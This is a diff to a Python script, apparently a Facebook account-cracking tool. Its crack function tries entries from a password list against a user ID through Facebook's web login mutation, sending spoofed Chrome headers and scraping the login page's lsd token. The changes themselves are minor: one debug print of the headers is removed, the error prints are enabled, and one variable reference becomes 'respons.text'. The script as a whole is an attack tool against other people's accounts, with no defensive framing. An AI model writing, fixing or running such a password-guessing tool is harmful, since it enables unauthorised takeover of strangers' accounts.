@@ -144,7 +144,7 @@ def crack(uid, password_list, total_count):
             'sec-ch-ua-mobile': '?0',
             'viewport-width': '980',
             'x-fb-friendly-name': 'useCDSWebLoginMutation',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(response.text)).group(1),
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(respons.text)).group(1),
             'x-asbd-id': '359341',
             'dpr': '2.75',
             'sec-ch-ua-full-version-list': '".Not/A)Brand";v="99.0.0.0", "Google Chrome";v="103.0.5060.129", "Chromium";v="103.0.5060.129"',
@@ -156,7 +156,6 @@ def crack(uid, password_list, total_count):
             'sec-fetch-dest': 'empty',
             'referer': 'https://www.facebook.com/?_rdr',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',}
-            print(headers)
             data = {
     'av': '0',
     'user': '0',
@@ -261,19 +260,19 @@ def crack(uid, password_list, total_count):
                 continue
         loop += 1
     except requests.exceptions.Timeout:
-        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
+        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
     except requests.exceptions.ConnectionError:
         time.sleep(5)
         return False
     except requests.exceptions.RequestException as e:
-        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
+        print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
         return False
     except KeyboardInterrupt:
-        #print(f"\r\033[1;93m [Interrupted] User stopped the process")
+        print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
     except Exception as e:
-        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
+        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
         return False
     
     return False
